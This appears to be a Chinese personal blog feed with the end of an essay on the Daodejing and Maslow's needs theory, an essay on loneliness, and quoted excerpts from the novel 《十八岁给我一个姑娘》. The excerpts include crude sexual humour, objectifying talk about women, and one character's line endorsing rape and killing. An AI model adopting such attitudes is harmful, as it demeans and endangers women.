Maslow提出的融合了精神分析心理学和行为主义心理学的人本主义心理学以及“马斯洛需求层次理论”所共同具备的理论基础，亦即他本人在《动机与人格》 一书中提到的“人的最迫切的需要才是激励人行动的主要原因和动力。”这一信条不谋而合！仁义的体系并非因为圣人提倡而被需要，恰恰是因为需要而被提倡，所以从它的被提倡这一现象中，我们明白，仁义被需要这一事实无处遁形。</p><p>这看似朴素的思维方式，其价值却不容小觑。如果能够掌握并很好地应用，就能够在人际事务中起到十分惊人的效用，相反地，如若不能谙熟各种玄妙，就十分不利于成事立功。我们可以看到《三国演义》 中有如下段落:</p><blockquote><p>孔明传令：“将旌旗尽皆隐匿；诸军备守城铺，如有妄行出入，及高声言语者，立斩！大开四门，每一门用二十军士，扮作百姓，洒扫街道。如魏兵到时，不可擅动，吾自有计。”孔明乃披鹤氅，戴纶巾，引二小童携琴一张，于城上楼前，凭栏而坐，焚香操琴。却说司马懿前军哨到城下，见了如此模样，皆不敢进，急报与司马懿。懿笑而不信，遂止住三军，自飞马远远望之。果见孔明坐于城楼之上，笑容可掬，焚香操琴。左有一童子，手捧宝剑；右有一童子，手执尘尾。城门内外，有二十余百姓，低头洒扫，旁若无人。懿看毕大疑，便到中军，教后军作前军，前军作后军，望北山路而退。</p></blockquote><p>这是《三国演义》第九十五回:马谡拒谏失街亭，武侯弹琴退仲达。诸葛孔明不得已而用空城计，但可惜司马懿不懂得很好地实践这一朴素的道理，加之生平谨慎多疑，于是放虎归山，令诸葛亮逃过一劫。这于司马懿，是多么惨痛的教训，而归其缘由，不过是少了一分透视人心人性的睿智罢了。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>综上所述，道德经这一章节在人际关系方面给我们的启示主要有两点：<br>应当以合于道德的心境，合于仁义的方式去为人处世；<br>应当尝试通过表象去透视他人的真实状况和确切需求。<br>《道德经》是我泱泱华夏两千余年文明的源头活水，无论在历史的哪一个时期，我们都有理由相信它能够熠熠生辉。而我们应当做的就是不断地学习学习再学习，思考思考再思考，并且将宏大的哲学思想应用进我们琐碎的个人生活，从而获得个人人生价值和社会价值的更大实现。此去道阻且长，我辈当勉力强行！</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ol><li>夏征农：《辞海》1999年版 缩印本（音序，一卷本），上海辞书出版社2002年1月版<br>.    《汉语大词典》（在线词典，链接：<a href="http://www.guoxuedashi.com/hydcd/）" target="_blank" rel="noopener">http://www.guoxuedashi.com/hydcd/）</a><br>.    管锡华：《尔雅》，2014年中华书局版<br>.    东汉·许慎：《说文解字》，湖北美术出版社2013年版<br>.    战国末期·赵国·荀况：《荀子》，上海古籍出版社2014年版<br>.    三国·魏·王弼：《王弼老子注》，中华书局2011年版<br>.    战国中期·宋国·庄周：《南华经》，三秦出版社1995年版<br>.    徐志远，蕾蕾：《听南怀瑾讲人生感悟》，长江文艺出版社2010年版<br>.    美国·Abraham Harold Maslow：《动机与人格》，中国人民大学出版社2008年版<ol start="0"><li>元末明初·山东·罗贯中：《三国演义》，时代文艺出版社2000年版                    </li></ol></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>关于孤独的遐想</title>
      <link href="/mind/170430FeelingLonely/"/>
      <url>/mind/170430FeelingLonely/</url>
      
        <content type="html"><![CDATA[<p>有时我向往孤独，甚至认为一个孤独的人是无比可爱的。</p><p>他一个人饮食起居，读书跑步，看朝霞落日，听夏蝉冬雨，在岁月里独来独往,无拘无束。他没有希望，也没有回忆，仅仅陪着肉体，磨着时日。<br>他很无聊，但也有趣，有趣得无聊，无聊得有趣，固守些自以为是的幻觉。他不说话，首先无人共讲，其次他不相信语言，一如不相信文字。他十分坚定地认为，说出的都是谎言，写下的都是虚假，发生的都无意义，表达即是欺骗。不论是欺骗自我还是他人，都是愚蠢，他能够忍受一切，唯独除了愚蠢。但事实上，无论离开人群多远，表达伴随呼吸，愚蠢如影随形，他永远无法摆脱愚蠢。因此，他选择在孤独中与愚蠢斗争，而不是在人群中成为愚蠢的一部分。也许愚蠢始终是愚蠢，不论是一个人的愚蠢还是一群人的愚蠢，但他认为，孤独是可以以之一搏的武器。当然，他没有怀任何希望，仅仅是一搏。仅仅是这一搏，让我觉得可爱。</p><p>有时我厌恶孤独，甚至认为一个孤独的人是相当可耻的。他一个人背向族类，面目可憎，任时光虚度，叹痴心无着，在天地间苟且偷安，踽踽独行。他没有爱人和朋友，就没有牵挂和依恋。相应的，浩渺恒宇，千万物类中没有任何东西在意他，甚至没有一粒尘埃与他有关。<br>他醉酒在古城的星辰中，流浪在都市的黄昏里，人来人往，一概无干。他看见童叟昏昏，男女依依，车马扬尘，行色匆匆，只摇头心道春风不如旧年。他无力体味欢乐与悲苦，无心承担责任与荣耀，生活于他是无尽的煎熬。当然，煎熬是矫情，他没有任何浓烈的情感。这样的他首先是可悲的，其次是可耻的。人身难得，得人身而无心无性，不如猪犬。生而为人，不如猪犬，岂不可耻。他以为孤独是天选，是不可奈何，却不知孤独是懦弱，是卑鄙，是自我放逐。每一次春风拂面，总念不如旧年，殊不知并无旧年，年年都新，所谓旧年不过在意淫之中。这看来实在可耻。<br>我有许多痛苦，但我渐渐发现他们有相似的缘由，就是无法忍受灰色，不黑不白，亦黑亦白的灰色。黑白使我安心，灰色使我惶恐，至于原因，大概是，如果灰色既不是黑色也不是白色，那么灰色到底是什么颜色。搞不清灰色的颜色这点，是我惶恐不安的焦点。只能接受白色或者黑色这点，我有时美其名曰理想主义，但更多时候我认识到，这只是一种愚蠢，一种不成熟，是我致命的弱点，也是我极度可悲之处。我多么羡慕一些人，他们慷慨地解答我的疑惑，灰色的颜色是灰色，既不是白色，也不是黑色。</p><p>横竖撇捺，一派胡言，竟也耗一夜光景，成草草千言。不如闭嘴。</p><p><code>2017年4月30日20:57:25</code></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>《十八岁给我一个姑娘》</title>
      <link href="/mind/161212AGirlFor18/"/>
      <url>/mind/161212AGirlFor18/</url>
      
        <content type="html"><![CDATA[<p><img src="595351bae1491.png" alt="18sui1.png"><br><img src="595351bae365f.png" alt="18sui2.png"><br><img src="595351badf473.png" alt="18sui3.png"><br><img src="595351bad417f.png" alt="18sui4.png"></p><h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><p>“事后想来，如果时候对，如果老流氓孔建国会些医术，被当权部门用钉子钉死在木板上，过几百年就是另一个耶稣。如果老流氓孔建国会说很多事儿逼的话，被刘京伟、张国栋和我记录下来整理出版，过几千年就是另一个孔丘。<br>“</p><p>“他说，如果时候对，围着他的这堆野小子里就会出刘邦，就会出朱元璋。”</p><p>“我让老流氓孔建国高兴，因为我能迅速领会每一种精致的低级趣味，别的野小子还在做思想斗争的时候，我已经笑得很淫荡了。老流氓孔建国说我也让他头痛，因为我记性太好，老流氓孔建国不得不绞尽智慧回忆起或创造出新的趣事。这件事随着老流氓孔建国记忆力和创造力的减退以及我的不断成长而变得越发艰难。”</p><p>“根据老流氓孔建国回忆，当老流氓孔建国有一天不得不怯生生地开始重复一个黄故事的时候，他在我的眼珠滚动里看到了一种他不能鄙视的鄙视。从那天起，我再也没有回过防空洞课堂。<br>“</p><p>“我和老流氓孔建国讨论，我说刘京伟眼里有光、下身总是硬硬的、元气充盈，将来一定了不起。他骨子里的贪婪常常体现在小事情上，一根冰棒，他会一口吞到根部，再慢慢从根部嘬到尖尖儿，第一口就定下基调：从根到尖，涂满他的哈喇子，全部都是他的。老流氓孔建国却说他神锋太俊，知进不知退，兴也速、败也速，弄不好，还有大祸，充其量也就是一个军阀的胚子。我听了糊里糊涂的。老流氓孔建国又说，我也很贪婪，眼里也有光，但是我的眼底有很重的忧郁。我更糊涂了，知道不是什么好话，就嚷嚷：“你丫别扯淡了，我平面几何考试怎么及格还不知道呢。你再胡说，我到胡大妈那儿告你企图鸡奸。”<br>“</p><p>“楼下老头子们讲，梦里的都是妖魔鬼怪，吸走的都是真阳。真阳没了，眼珠子也就不转了，鼻涕快流进嘴角的时候也不能及时地吸进鼻孔了。<br>“</p><p>“他们说起他们过去的故事，我总是将信将疑。<br>“</p><p>“没有法子，男人只有自己出门找水喝， 怕人家不乐意给， 随身带上了刀。<br>“</p><p>“　　黑胖子的老婆说黑胖子原来在炮兵部队上是厨师班长，从来只负责偷吃不管干活。我想，没有比黑胖子过去的职业更悲惨的了，戴绿帽子、背黑锅、看别人打炮。</p><p>“</p><p>“明里不见人头落，暗中叫你骨髓枯。刘京伟和张国栋认定，随着时间流逝，我即使不会精尽而亡，也会渐渐出落成为一个没有出息的笨人”</p><p>“她可能不是同谋，只是阴谋的一部分。<br>“</p><p>“我看不见人们的灵魂，但是，隔着裤裆，我看得见他们的阴茎。”</p><p>“我当然也有理想啊。我的理想是娶最漂亮的姑娘，写最无聊的文章，精忠报国，实现四个现代化。你是我见过的最漂亮的姑娘，不娶你娶谁呀？”<br>“</p><p>“你以为是个生人，或许他曾经和你睡过同一个姑娘呢。”<br>“</p><p>“桑保疆是倒尿盆长大的，这个，他懂不了。</p><p>“</p><p>“其实我们最终都是要亮出阳具的，但是一开始就亮的是露阴犯，大婚之后的是行天地之礼。<br>“</p><p>“我的长相平庸而粗糙，但是我的内心精致而细腻。我和老流氓孔建国说，别看我长得象个杀猪的，其实我是个写诗的。<br>“</p><p>“那个写诗的晚上，我速读《诗经》，跳过所有祭祀章节和不认识的文字，明白了“赋比兴”和“郑风淫”、最大的写诗诀窍就是找到心中最不安最痒痒的一个简单侧面，然后反复吟唱。那个写诗的晚上，我写完了我这辈子所有的诗，之后再也没有写过一句，就象我在十六岁至十八岁期间耗尽了我对姑娘的所有细腻美好想象，之后，所有的姑娘在我的眼里都貌美如花。”</p><p>“我以前总是纳闷，街面上日日在自己面前飘然而过的那些美若天仙的姑娘们回家后都和谁睡觉。观察过朱裳父母之后我清楚了，就是和朱裳爹这种人。这种人坐不出龙椅和马扎的区别，赏受着上等的女人，无知无觉，问心无愧，如得大道。否则的话，对绿帽子的担心，就会让他少二十年阳寿。<br>“</p><p>“美人在专心开车，不象平日里一样过分专注于自己的美丽，所以格外好看。<br>“</p><p>“后来，我学了心理学，才感觉到，少年时期很多美好想象都是境由心生，没看过猪跑，更没吃过猪肉，把对凤凰的想象都拽到母猪身上了。<br>“</p><p>“我一觉醒来，大吼一声：“大梦谁先觉，平生我自知”。想起过去创作这首打油诗的诸葛亮，在那个叫南阳卧龙岗的地方，种田、读书、钱多的时候叫鸡、钱少的时候手淫，觉得自己生不逢时。<br>“</p><p>“是孔明就要论天下，是关公就要舞大刀”。刘京伟和张国栋听到，一定会加盟，老流氓孔建国听到，一定会加盟，这就是文字的力量。<br>“</p><p>“现在的空气脆而冷，就在这种天气里，一个案件发生了重大的转折，好人坏人正义邪恶变得混沌不清，各种关系纠缠在一起，不是案件，而是一个阴谋。女孩作为一个整体在这个阴谋里起的作用极其重大而微妙，朱裳的意义更加隐涩。”</p><p>“好象忽然一夜间，所有男生都想有一双名牌运动鞋，耐克、阿迪达斯、彪马…仿佛一双名牌鞋能添无数牛逼和小女生的目光。在之后的进化过程中，男生变成男青年，中年男子，老头，这双名牌运动鞋也随着变成名牌手提电脑和名牌山地车，一米七八一头长发的妖艳女友和宝马Z3以及郊区豪宅，一米六零胸大无脑柔腻软滑的十八岁女孩和明紫檀木画案以及半米长的红山玉龙形钩，但是，给予不同阶段的男性生物，同样的渴望、困扰、狂喜和无可奈何。<br>“</p><p>“刘京伟是个头脑灵活但是无比简单的人。他短暂的一生都在追求牛逼。不同阶段，追求不同的牛逼，所有追求到的牛逼加总就构成了刘京伟短暂而牛逼的一生。<br>“</p><p>“第二天，刘京伟请我和张国栋在朝阳门外的桥头酒店吃五块一斤的三鲜饺子，他吃得很少，两手抱着他新买的白地蓝钩高帮耐克鞋，那双鞋用鞋带串在一起，跨在他脖子上，左脸边一只，右脸边一只，每只都比他的脸大，比他脸白。刘京伟两眼望着天花板长久沉默，他忽然说：“牛逼，牛逼啊。”</p><p>“后来，刘京伟的激素水平发育到觉得有个妖艳女友是牛逼的。刘京伟对我说：“我没有你会臭侃山，没有张国栋长得清秀。我怎么办呀？”我说：“总有办法的。”张国栋说：“再生一回吧。”刘京伟说：“张国栋你闭嘴。只要我活着，就会比你牛逼。你再清秀也是一堆清秀的狗屎。我和秋水说话。秋水，你有一点我特别佩服，你的自制力极好。你一个人呆的时候该看书也看书，该修炼你的文字就修炼你的文字。我也要在一个指定的方向上使力气，我也要修炼。”他于是修炼了一身腱子肉，条条块块，是姑娘都想摸。他冬天也穿紧身短袖，像个脱了皮的蛤蟆。为了长肌肉，他每天不吃饭，在最短的时间喝二十五个生鸡蛋。”</p><p>“。张国栋问刘京伟，这样练，阳具也跟着变大吗？刘京伟说，不是，反而缩小，因为血都充到其他大块肌肉上去了。张国栋说，那我就不练了。我说，锻炼不同肌肉的道理是一样的，就是反复充血，你应该多看黄书，但是要保持不射。张国栋说，自摸行吗？刘京伟看了看我，我们同时说，行，可你丫能保持不射吗？”</p><p>“再后来，刘京伟的大奔里没有姑娘香水味了，刘京伟欢快地对我说：“你知道现在最牛逼的是什么吗？是雇哈佛大学毕业的MBA。我把姑娘们都打发了，雇了三个今年刚从哈佛大学毕业的MBA。”</p><p>“这时候的女孩个个可看。即使最丑的姑娘也有动人的时候。</p><p>“</p><p>“后来的后来，我在老流氓孔建国的教导下玩玉。老流氓孔建国说：“你早上睡醒之后，摸摸下体，如果已经不是一柱擎天了，说明你的真阳已经不足。有些人在三十发现，有些人四十。这时候，你对真善美的兴趣就应该从姑娘转到玉。处女是新玉新工，贼光扎眼。二十几岁是清初件，康乾盛世呀。三十几岁是宋元明，‘明大粗’。四十来岁是商周古玉，铅华洗尽，没有一丝火气，美呀。玉好像姑娘，也需要陪，需要珍爱，需要一日三摸搓，可以戴，可以显摆，可以放进被窝儿。玉比姑娘好，不离不弃，不会逼你一夜三举，还可以洗洗留给儿子。算了算了，别老想着朱裳和翠儿了，昨天我在古玩城小崔那儿看见一个商早期的圆雕玉虎，青玉，十多个厘米长，沁色美极了，太少见了，图谱上有片儿的，够上拍卖会进博物馆的。准备几万块钱，咱们明天把它拿下。”</p><p>“不要老拿你的大油手在玉上摸来摸去，玉会污的，污了就再也干净不了了。真正的盘玉，是戴在身边，用身子煨着，用脑子想着，把你意淫文字的功夫用到这儿来，一两个星期用热水泡一下，用粗白布擦。不要老拿你大油手摸，糟践好东西。””</p><p>“我们不要音乐要叫喊，</p><p>　　我们不要道理要金钱，</p><p>　　我们不要先生要混蛋，</p><p>　　我们不要女生要天仙。</p><p>　　为什么越用功的女孩脸蛋越苦？</p><p>　　为什么我越想越糊涂？</p><p>　　为什么几千年都过去了，</p><p>　　还没有另一个秦始皇烧干净书？</p><p>　　姑娘你仰头总是绷着漂亮的脸，</p><p>　　仿佛要沾你的一定是个款，</p><p>　　为了心理平衡我想问几遍，</p><p>　　你是否也天天大小便？”</p><p>“</p><p>“如果从小长到大是个电子游戏，游戏里有好些凶险的大关卡，最早是如何应对父母，如何和兄弟姐妹相处，如何和发小一块玩耍，然后是如何对付摆在你面前的象朱裳这样天生狐媚的姑娘，如何对付混蛋的教导主任和白痴数学老师，然后是每个人都有的老板和老婆，然后是整日呼啸的小孩、父母的老去。面对朱裳这个题目，我们没有一个男生答对了。有些人给自己一个借口，反正也试过了，有些人索性忘记了，有些人找个眉眼类似的，反正没人知道正确答案，所有人都在游戏里过了关，可能编游戏的人是个逻辑不清的人吧，很少较真。”</p><p>“　　在书里倦了，合上书，找个晦涩的角度看朱裳，我觉得明目爽脑，仿佛夜里读书累了，转头细看窗子里盛着的星星。过去没有电视和互联网，我们和古人一样，看自己的身体，看天空的星星，看同桌的姑娘，在简单中发现复杂的细节和普遍的规律。<br>“</p><p>“关于朱裳，我该学习多少次呢”</p><p>“我要老到什么时候才能忘掉这些记忆？我是学医的，我知道即使失去双手，双手的记忆也还是在的”</p><p>“。”</p><p>　　我从枕头底下拿出来藏着的一包大前门，反锁了宿舍门，点上一根给张国栋，自己再点一颗。我坐在我床铺前的桌子上，向张国栋表白，希望他能理解：</p><p>　　“我坐在朱裳身边，如果天气好，窗户打开，风起来，她的发梢会偶尔撩到我的脸，仿佛春天，东三环上夹道的垂柳和骑在车上的我。” 我看着张国栋，接着说：“你明白我的意思吗？”</p><p>　　“我明白了。”张国栋收起书包，“杂志你先看吧，借你的，不是送你的呦。”</p><p>“张国栋说，他还记得我面对黄色杂志的表白，记得东三环上夹道的垂柳和朱裳的相似，这个意象对他很重要，等他挣够了钱，他一定写个关于这个意象的本子，然后拍个不赚钱的片子。”</p><p>“在张国栋摊了一堆黄色杂志，和我交涉换座位之后，他时常找我聊天。话题总是围绕女人，特别是关于朱裳。在我漫长的求学过程中，男生和男生之间时常进行这种交流，题目多数是关于女人，偶尔涉及考试和前程。如果把考试的定义扩大，女人也是考试题目，我们长久地讨论，以期充分理解题目，上场的时候争取马虎过关。刘京伟从来不参加这种讨论，他说我具备一切成事的素质，只是想得太多。刘京伟不喜欢念书，不喜欢考试，他喜欢他的一切都是标准答案。刘京伟通常采取的态度是：“我就这么做了，怎么着吧?”他看见我茫然不解，就举例说明：“比如你喜欢一个姑娘，就按倒办了，丫不开心，就杀，就走。如果心里还是喜欢，下次再遇见，再奸，再杀。”我说这些道理太高深，无法顿悟，我天分有限，不念书不考试就无法懂得。刘京伟预言，他都死了，我的书还没读完。刘京伟一语成谶，我参加他的葬礼的时候，关于卵巢癌发生机制的博士论文才刚刚写完初稿，答辩会还没有安排。<br>“</p><p>“他说我具备一切成事的素质，只是想得太多”</p><p>“姑娘又不是阿拉伯数字, 不具有可比性。 玫瑰好看, 做汤肯定没有菜花好吃。”</p><p>“</p><p>“只是干净？”</p><p>　　“你以为干净简单？我觉得你张国栋让女孩感觉舒服，你以为这‘舒服’二字简单？”</p><p>　　“就是呀，我这种气质，很难培养的，每周都要洗澡，每天都要刷牙。还有，要看书，多看书，‘腹有诗书气自华’。还有，要多思考，否则就肤浅了。绝不简单。”</p><p>“追她的人已经够多的了。我不喜欢锦上添花。”<br>“</p><p>“就是。好象是个男的就应该想和她有一腿似的。我都有点压不住邪念了。不过，多点追的才有意思，横刀夺爱，方显英雄本色。”<br>“</p><p>“持续学坏是一件多么令人兴奋的事呀。可惜不是什么好烟，‘红梅’。本来第一支应该是支好烟，就象童男子破身之后通过政治思想学习，再次成为童男子，再次破身应该是个好姑娘，至少也应该和朱裳差不多吧。”<br>“</p><p>“书之外，还有别的要懂的东西。<br>“</p><p>“学抽烟为了学坏，</p><p>　　学坏为了学习长大。</p><p>　　学习长大得厌恶爸爸，</p><p>　　再杀死他。</p><p>　　学习长大得爱上妈妈，</p><p>　　再抛弃她。”<br>“</p><p>“你这么抽烟纯属浪费，”张国栋深吸一口烟，吞进肺里，再慢慢地让烟一丝丝地从鼻孔飘出来，青烟曲折回转散入周围的黑暗之中。 “想上就别憋自己。你有戏。”</p><p>　　“是么？”</p><p>　　“她喜欢你。”</p><p>　　“为什么？”</p><p>　　“你喜欢书，读得仔细，你有时候就是你喜欢的书。你能迷上你的书，别人也会迷上你。”<br>“</p><p>“你说别人的事总是出奇的明白，遇到自己的事总是嫩。这事呀，你试试就知道了.就象有些事不用教，上了床自然就会了。再说你也没骚扰过小姑娘，也没少被小姑娘骚扰呀，怎么一到朱裳这儿就发木？咱们学校躲在树后面看你的姑娘不比原来躲在山洞里流着口水等着吃唐僧肉的妖精少。”<br>“</p><p>“我想起我的小屋。周末回去，胡乱填几口饭，反锁上门，世界就和我无关了。拉上窗帘，大红牡丹花的图案就把所有光线割断，包括星星。打开台灯，昏黄的光线将满溢在小屋里的书烘暖。书从地板堆到屋顶，老妈说，书上不省钱，想看什么就买什么，读书多的孩子孝顺。书不像古董，不是世家，省省也能请回家最好的。我和我姐姐站在琉璃厂中国书店高大的书架前，我问她，妈给你的钱够吗？我姐姐说，够。我对售货员说，我要一整套十六本《鲁迅全集》和一整套二十五本《全唐诗》。我问售货员，近百年是不是鲁迅最牛逼了，近两千年，是不是唐诗最牛逼了。”</p><p>“我摆开几个茶杯，杜牧，李白、劳伦斯、亨利米勒就静静地坐在对面。倒上茶，千年前的月光花影便在小屋里游荡。杜牧，李白、劳伦斯、亨利米勒已经坐在对面了，他们的文字和我没有间隔。我知道他们文字里所有的大智慧和小心思，这对于我毫无困难。他们的魂魄，透过文字，在瞬间穿越千年时间和万里空间，在他们绝不知晓的北京市朝阳区的一个小屋子里，纠缠我的魂魄，让我心如刀绞，然后泪流满面。第一次阅读这些人的文字对我的重要性无以伦比，他们的灵魂像是一碗豆汁儿一样有实在的温度和味道，摆在我面前，伸手可及。这第一次阅读，甚至比我的初恋更重要，比我第一次抓住我的小弟弟反复拷问让他喷涌而出更重要，比我第一次在慌乱中进入女人身体看着她的眼睛身体失去理智控制更重要”</p><p>“我第一次阅读杜牧，李白、劳伦斯、亨利米勒比我第一次解剖大脑标本，对我更重要。我渴望具备他们的超能力，在我死后千年，透过我的文字，我的魂魄纠缠一个同样黑瘦的无名少年，让他心如刀绞，泪流满面。我修炼我的文字，摊开四百字一页的稿纸，淡绿色，北京市电车公司印刷厂出品，钢笔在纸上移动，我看见炼丹炉里炉火通红，仙丹一样的文字珠圆玉润，这些文字长生不老。我黑瘦地坐在桌子前面，骨多肉少好像一把柴火，柴火上是炉火通红的炼丹炉。我的文字几乎和我没有关系，就像朱裳的美丽和朱裳没有太多联系，我和朱裳都是某种介质，就像古时候的巫师，所谓上天，透过这些介质传递某种声音。我的文字，朱裳的美丽，巫师的声音，有它们自己的意志，它们反过来决定我们的动作和思想。当文字如仙丹一样出炉时，我筋疲力尽，我感到敬畏，我心怀感激，我感到一种力量远远大过我的身体、大过我自己。当文字如垃圾一样倾泻，我筋疲力尽，我感觉身体如同灰烬，我的生命就是垃圾。”</p><p>“我对张国栋说：“我的屋子太小了，床上的书把我都快挤得没地方睡了。已经放不下别的了。” 杜牧，李白、劳伦斯、亨利米勒已经坐在对面了，朱裳坐在什么地方呢？</p><p>　　“那我就先追了？我可是跟你商量过了。”</p><p>　　“好。需要的话，我替你写情书，送小纸条。如果人家对你有意思，我把座位让给你。”<br>“</p><p>“从现在看来，我和朱裳的关系是由短暂的相好和漫长的暧昧构成。”</p><p>“小时候，我们性交不足，我们体力积累得无比好，”</p><p>“那时候，我和朱裳从天安门走到东单走到白家庄，北京夏天的白天很长，在半黑半白中，我们在43路车站等车，说好，下一辆车来了就分手。来了无数个下一辆，好多人下车，好多人上车，好多人去他们要去的地方。在等待无数个下一辆的过程中，我拉着朱裳的手，她的手很香。朱裳看着我的眼睛，给我唱那首叫Feelings的外文歌曲，她的头发在夏天的热风里如歌词飞舞，她说我睫毛很长。后来朱裳告诉我，她之后再没有那么傻过，一个在北京这样自然环境恶劣的城市长大的姑娘怎么可以这样浪漫。我说我有很多回想起来很糗的事，但是想起，在我听不懂的外文歌曲中，握着将破坏我一生安宁的姑娘的香香的手，永远等待下一辆开来的43路公共汽车，我感到甜蜜和幸福。”</p><p>“很多个小二锅头之后，朱裳说，在中学，她听不进课的时候、累的时候，都会不由自主地看我，认为我和别人不一样。教材、教参、习题集堆在我桌子上，堆成一个隐居的山洞，挡住老师的视线，我手里却常年是本没用的闲书。她觉得我是个真正的读书人，一个与她爸爸略相象的读书人。真正的读书人如同真正的厨子、戏子、婊子，身上有种与生俱来的对所钟情的事物的痴迷。书中的女人秀色可餐，书中的男人快意恩仇。书外如何，与真正的读书人无关。她喜欢看我脸上如入魔道的迷离，如怨鬼般的执著。我说：“是不是我长得象你爸就能娶到你妈那样的？”朱裳说：“我当时是年幼无知，看走了眼，其实只是你太瘦了，招眼，容易让人心疼。”</p><p>“我对朱裳说，女人或者复杂或者单纯，都好。但是，复杂要象书，可以读。简单要象玉，可以摸。当时的朱裳也不让解扣子，也不让上手摸，我能干什么呢？<br>“</p><p>“她坐在我旁边，忍不住会在我专心念闲书的时候看我。她感觉到与我本质上的相通：“一样的寂寞，一样的骨子里面的寂寞。这种寂寞，再多的欢声笑语，再迷醉的灯红酒绿也化解不开，随便望一眼舞厅天窗里盛的星空，喝一口在掌心里的隔夜茶，寂寞便在自己心里了。仿佛他打开一本闲书，仿佛我垂下眼帘，世界便与自己无关了。这种寂寞，只有很少的人懂得。”</p><p>“哥哥们看到朱裳小妹妹听得泪流满面，脸上珠串晶莹，不禁心惊肉跳，明白这个小妹妹心中有股大过生命的欲望，今生注定不能平凡。”</p><p>“最出色的一个看她的眼神开始不对了，试探着和她谈一些很飘渺很抽象的事。她开始害怕，大哥哥们不可爱了。<br>“</p><p>“安全第一，男孩第二”，她们的父母教育她们。<br>“</p><p>“翠儿除了演戏之外，不化妆，她说上妆毁容，就像写东西折寿一样”</p><p>“梯子当时跟我阐述，她年纪还小，还没想清楚是出国颠覆美国腐朽的资本主义还是留在国内大干社会主义，还没想清楚是青灯黄卷皓首穷经搞学术还是大碗吃肉大秤分金搞生意，所以洋书生和土大款都要交往。我说，同意，注意时间安排，注意身体，努力加餐饭。最后梯子选择了资本主义腐朽生活，到了美国一年后拿了绿卡，就和陕西洋考古离了婚，说是在美国一年到头吃不着有土腥味的活鲤鱼，却要整天睡有土腥味的老公，不靠谱。梯子马上找了个美国老头，有钱，有大房子，有心脏病，阴茎短小但是经常兴奋。老头是用直升机把梯子娶进那个大房子的，我见过婚礼上的照片，长得像大白胡子的圣诞老人，梯子皮肤光滑滋润，但是表情还是很坚毅。第一次上床，梯子说，就知道了老头的斤两，梯子还说，不是吹牛，如果她愿意，和老头隔着一千英里，电话性交，她能让老头心脏病发作，死在去医院的救护车上，脸上还充满淫荡的笑容。老头就是这样死了，梯子带着美国护照和天文数字的资产回到北京，对我说：“我从小都找比我老比我成熟的，追求前进追求光明，现在我要反过来了，你说，我是不是老了。”我说：“怎么会，你的肌肉还结实，腿上毫无赘肉。万马军中取上将首级，你还是易如反掌。而且，从另一个角度说，你又比我们早好几步领导了潮流。””</p><p>“我总对我的女朋友说，你是舞后，你玩儿你的，我一点都不在意，我替你在这儿看管大衣。我在角落里看我的女友在舞场里旋转，她的头发盘起来，她笑脸盈盈，她汗透春衫，我觉得她比和我在一起的任何时候都美丽。<br>“</p><p>“你乐感好，听着音乐、跟着我就好了。” 张国栋一笑，朱裳后来告诉我，张国栋有一种不属于淫荡的笑容，很容易让女孩想起阳光。”</p><p>“我有一种理论，物质不灭，天地间总有灵气流转，郁积在石头上，便是玉，郁积在人身上，便是朱裳这样的姑娘。玉是要好人戴的，只有戴在好人身上，灵气才能充分体现。女人是要男人抱的，只有在自己喜欢的男人怀里，灵气才有最美丽的形式。<br>“</p><p>“对浅吟低唱、春情萌动不感兴趣的一小堆男生正扎在一起猛吃剩在桌子上的公费瓜果梨桃、花生瓜子，大谈现代兵器、攻打台湾及围棋。”</p><p>“老僧亦有猫儿意，不敢人前叫一声”</p><p>“张国栋觉得，“文革”是一种节日。人可以活在天地间，可以打架，可以泡妞，可以象个好汉，名正言顺。男孩从打架中能学到不少东西：忍让，机智，必要的时候诉诸暴力。仿佛四、十万年以前，北京人还住周口店的时候，打架能让你获得猎物，泡妞能让你的姓氏繁衍。现在的混混只能学学港、台的小歌星，穿得光鲜亮丽，将来不会有大出息。<br>“</p><p>“人性是多么堕落呀!”</p><p>　　“我是多么喜欢堕落呀!”<br>“</p><p>“　　“回头再买十串羊肉串，多放孜然，多放辣椒，一人一瓶啤酒, 一边吃喝一边回学校。”</p><p>　　“啊, 生活!”</p><p>　　“太资产阶级情调了，小资”</p><p>“我们并肩走在大街上，我看见，路灯映照着张国栋、刘京伟、桑保疆的脸，他们脸上的粉刺大红大紫，灿若春花。侧头，天上是很好的月亮，好象什么都知道似的冷冷地瞧着。我们什么都不多想地朝前走，前面是不再刺骨的风. 将来是什么都会有的，我们没有一个人想到“穷则独善其身，达则兼善天下”。武侠小说上说，鲜衣怒马，年少多金。我们兜里各有三、五块钱，年轻真好。</p><p>　　而且，我们在当时那个时候，没有一个人想到姑娘。 我们手拉着手，像南北朝那时的同性恋一样，在大街上走。<br>“</p><p>“张国栋没呆多久就回来了，理由和几十年前毕加索的一样：艺术只有在东方，在中国和日本”</p><p>“张国栋在学校兼教职，他写信告诉我，原来姑娘也像庄稼和瓜果梨桃一样，每年都有新的一拨儿，新的一拨儿不见得比老的一拨儿难吃。”</p><p>“你们是不是皮肉发紧呀？” 我说”</p><p>“体育老师是个简单而纯朴的人，他挣很少的工资，一天三顿吃学校的食堂，最大的乐趣是帮助女生练习鞍马或是单杠等体操项目，他有一双温暖而肥厚的小手。孔丘说：天下有道，丘不与之易也。意思是，你牛逼，我也牛逼，我不拿我的牛逼和你的牛逼换，我不羡慕你。从小到大，我认真羡慕过的人只有两个，一个是这个体育老师，无论春夏秋冬，一年四季都有新鲜的姑娘屁股摸，特别是在当时的历史条件下，物质贫乏，冬天唯一的新鲜蔬菜是大白菜。另一个是我的外科教授，他主攻乳腺外科，每天早上出诊，诊室里都是小一百对焦急地等待他触摸的乳房。<br>“</p><p>“教导主任常说的话是：“自然给孩子以身体,而我们塑造他们的灵魂。”他讲这句话的时候没有感到可怕，感到的是巨大的责任与成就。<br>“</p><p>“不建学校，就得多建监牢。学校人少，监牢中的人就会多。学校办得差，监牢中就会人满为患。”他在教师会上讲这番话的时候感觉自己象个将军。“中学生，说到底还是孩子。正处于人生观，世界观形成阶段，象一块未琢磨的璞玉，未着色的白纸。不是他们缺少问题，而是我们缺少发现。”</p><p>“在教导主任眼里，怎么可能没问题呢？就象有些花要香，有些雨要下，有些娘要嫁一样，有些人从小注定不安分。<br>“</p><p>“ 